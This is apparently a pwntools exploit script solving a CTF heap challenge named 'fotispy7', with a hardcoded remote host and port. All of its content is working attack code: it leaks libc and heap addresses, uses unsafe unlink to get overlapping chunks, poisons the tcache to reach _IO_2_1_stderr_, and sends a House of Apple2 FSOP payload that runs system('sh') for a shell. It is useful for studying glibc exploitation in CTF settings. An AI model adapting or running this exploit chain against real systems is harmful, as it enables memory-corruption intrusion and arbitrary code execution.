
#!/usr/bin/env python3
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './fotispy7_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
# libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "52.59.124.14", 5197



gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if (not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB):
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def fsop_shell(fp=None, rip=None, exit=True):
    io_obj = IO_FILE_plus_struct()
    fn = (
        io_obj.house_of_apple2_execmd_when_exit
        if exit
        else io_obj.house_of_apple2_execmd_when_do_IO_operation
    )
    return fn(
        fp if fp is not None else libc.sym["_IO_2_1_stdout_"],
        libc.sym["_IO_wfile_jumps"],
        rip if rip is not None else libc.sym["system"],
        "sh",
    )


def menu(op):
    sla(": ", str(op).encode())

def edit_up(op, content):
    menu(1)
    sla(": ", op)
    sla(": ", content)

def create_playlist(name, desc):
    menu(2)
    sla(": ", name)
    sla(": ", desc)

def edit_playlist(op, content):
    menu(3)
    sla(": ", op)
    sla(": ", content)

def show_playlist():
    menu(4)
    ru(": ")

def delete_playlist():
    menu(5)

def create_song(title, album, artist):
    menu(6)
    sla(": ", title)
    sla(": ", album)
    sla(": ", artist)

def edit_song(idx, op, content):
    menu(7)
    menu(idx)
    sla(": ", op)
    sla(": ", content)

def show_song():
    menu(8)

def delete_song(idx):
    menu(9)
    menu(idx)

def user_debug():
    menu(10)

def exploit():
    global io
    io = initialize()
    debug()
    with log.progress("Preparing chunks"), context.silent:
        sla("username: ", b"A"*0x20)
        sla("password: ", b"B"*0x10)
        for i in range(7):
            create_song(b"A", b"B", b"C")
        create_song(b"A", b"B", b"C")
        create_song(b"A", b"B", b"C")
        create_song(b"A", b"B", b"C")
        create_song(b"A", b"B", b"C")
        create_song(b"A", b"B", b"C")
        create_song(b"A", b"B", b"C")
    with log.progress("Leaking libc & heap address"), context.silent:
        for i in range(7):
            delete_song(i)
        delete_song(i+1)
        delete_song(i+2)
        create_playlist(b"", b"")
        user_debug()
        ru("[000000] ")
        libc_leak = int(b"0x" + rl().strip(), 16)
        libc.address = libc_leak - 0x1e7d00
        ru("B"*0x10)
        heap_leak = u64(r(6).ljust(8, b"\x00"))
        heap = heap_leak & ~0xfff
    leak("Libc leak", hex(libc_leak))
    leak("Libc base address", hex(libc.address))
    leak("Heap leak", hex(heap_leak))
    leak("Heap base address", hex(heap))

    with log.progress("Use unsafe unlink to get overlapping chunk"), context.silent:
        edit_song(10, b"r", b"\x00"*0x50 + p64(0xf0))
        target = heap + 0xda0
        edit_song(10, b"t", p64(0) + p64(0xf1) + p64(target - 0x18) + p64(target - 0x10))
        edit_song(11, b"t", p64(heap + 0xca0))
        delete_song(11)

    with log.progress("Clean tcache & tcache poisoning to _IO_2_1_stderr_ & fsop exit"), context.silent:
        for i in reversed(range(7)):
            create_song(b"A", b"B", b"C")
        create_song(b"", b"", b"")
        delete_song(0)
        delete_song(7)
        edit_song(10, b"t", p64(0x0) + p64(0x101) + p64(mangle(heap, libc.sym['_IO_2_1_stderr_'])))
        create_song(b"", b"", b"")
        payload = fsop_shell(fp=libc.sym["_IO_2_1_stderr_"], rip=libc.sym.system, exit=True)
        create_song(payload[:0x48], payload[0x48:0x48+0x58], payload[0x48+0x58:])
        menu(0)
    io.interactive()

if __name__ == '__main__':
    exploit()
